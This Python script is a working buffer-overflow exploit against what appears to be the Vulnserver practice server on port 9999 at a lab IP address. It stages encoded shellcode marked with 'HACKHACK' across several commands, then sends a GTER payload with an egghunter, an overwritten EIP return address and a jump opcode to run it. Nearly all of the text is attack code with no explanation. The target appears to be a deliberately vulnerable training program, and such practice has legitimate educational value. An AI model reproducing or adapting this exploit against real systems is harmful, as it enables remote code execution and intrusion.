import socket
import struct

buf =  b""
buf += b"\xb8\x70\x14\x35\xa8\xdb\xc0\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\x33\x1a\xd7"
buf += b"\x5d\x4f\xca\x95\x9e\xaf\x0b\xfa\x17\x4a\x3a\x3a\x43"
buf += b"\x1f\x6d\x8a\x07\x4d\x82\x61\x45\x65\x11\x07\x42\x8a"
buf += b"\x92\xa2\xb4\xa5\x23\x9e\x85\xa4\xa7\xdd\xd9\x06\x99"
buf += b"\x2d\x2c\x47\xde\x50\xdd\x15\xb7\x1f\x70\x89\xbc\x6a"
buf += b"\x49\x22\x8e\x7b\xc9\xd7\x47\x7d\xf8\x46\xd3\x24\xda"
buf += b"\x69\x30\x5d\x53\x71\x55\x58\x2d\x0a\xad\x16\xac\xda"
buf += b"\xff\xd7\x03\x23\x30\x2a\x5d\x64\xf7\xd5\x28\x9c\x0b"
buf += b"\x6b\x2b\x5b\x71\xb7\xbe\x7f\xd1\x3c\x18\x5b\xe3\x91"
buf += b"\xff\x28\xef\x5e\x8b\x76\xec\x61\x58\x0d\x08\xe9\x5f"
buf += b"\xc1\x98\xa9\x7b\xc5\xc1\x6a\xe5\x5c\xac\xdd\x1a\xbe"
buf += b"\x0f\x81\xbe\xb5\xa2\xd6\xb2\x94\xaa\x1b\xff\x26\x2b"
buf += b"\x34\x88\x55\x19\x9b\x22\xf1\x11\x54\xed\x06\x55\x4f"
buf += b"\x49\x98\xa8\x70\xaa\xb1\x6e\x24\xfa\xa9\x47\x45\x91"
buf += b"\x29\x67\x90\x36\x79\xc7\x4b\xf7\x29\xa7\x3b\x9f\x23"
buf += b"\x28\x63\xbf\x4c\xe2\x0c\x2a\xb7\x65\x39\xad\x80\x5f"
buf += b"\x55\xb3\xee\x8e\xfe\x3a\x08\xda\x10\x6b\x83\x73\x88"
buf += b"\x36\x5f\xe5\x55\xed\x1a\x25\xdd\x02\xdb\xe8\x16\x6e"
buf += b"\xcf\x9d\xd6\x25\xad\x08\xe8\x93\xd9\xd7\x7b\x78\x19"
buf += b"\x91\x67\xd7\x4e\xf6\x56\x2e\x1a\xea\xc1\x98\x38\xf7"
buf += b"\x94\xe3\xf8\x2c\x65\xed\x01\xa0\xd1\xc9\x11\x7c\xd9"
buf += b"\x55\x45\xd0\x8c\x03\x33\x96\x66\xe2\xed\x40\xd4\xac"
buf += b"\x79\x14\x16\x6f\xff\x19\x73\x19\x1f\xab\x2a\x5c\x20"
buf += b"\x04\xbb\x68\x59\x78\x5b\x96\xb0\x38\x6b\xdd\x98\x69"
buf += b"\xe4\xb8\x49\x28\x69\x3b\xa4\x6f\x94\xb8\x4c\x10\x63"
buf += b"\xa0\x25\x15\x2f\x66\xd6\x67\x20\x03\xd8\xd4\x41\x06"
shellcode = buf

egghunter = [b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74",
b"\xef\xb8\x48\x41\x43\x4b\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"]

egghunter = b"".join(egghunter)
#badchars = b"".join([struct.pack("<B",x)for x in range(1,128)])

for command in [b'STATS', b'RTIME', b'LTIME', b'SRUN', b'TRUN', b'GMON', b'GDOG', b'HTER', b'LTER', b'KSTAN']:
    s = socket.socket()
    s.connect(("10.6.55.214",9999))
    shell = command + b'HACKHACK' + shellcode
    s.send(shell)

new_eip = struct.pack("<I",0x62501203)
s = socket.socket()
s.connect(("10.6.55.214",9999))
offset = 151
total_length = 200
jump_opcode = b"\xe9\x61\xff\xff\xff"
payload= [

    b"GTER ",
    egghunter,
    b"A" * (offset-len(egghunter)),
    new_eip,
    jump_opcode,

    b"C" * (total_length-offset-len(new_eip)-len(jump_opcode)-len(egghunter))
   

]
payload = b"".join(payload)
s.send(payload)